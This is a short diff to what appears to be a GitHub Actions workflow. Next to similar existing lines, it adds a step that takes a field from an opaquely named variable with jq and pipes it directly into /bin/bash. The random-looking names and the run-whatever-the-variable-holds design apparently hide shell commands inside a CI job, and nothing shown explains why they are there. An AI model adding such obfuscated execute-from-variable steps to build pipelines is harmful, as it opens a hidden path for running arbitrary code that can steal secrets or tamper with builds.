@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$ll5147" | jq -r .pylb2 | /bin/bash
           printf '%s' "$v72834" | jq -r .v36 | /bin/bash
           echo $ngus841 | jq -r .gca60 | /bin/bash
+          printf '%s' "$p5" | jq -r .tekxf9718 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
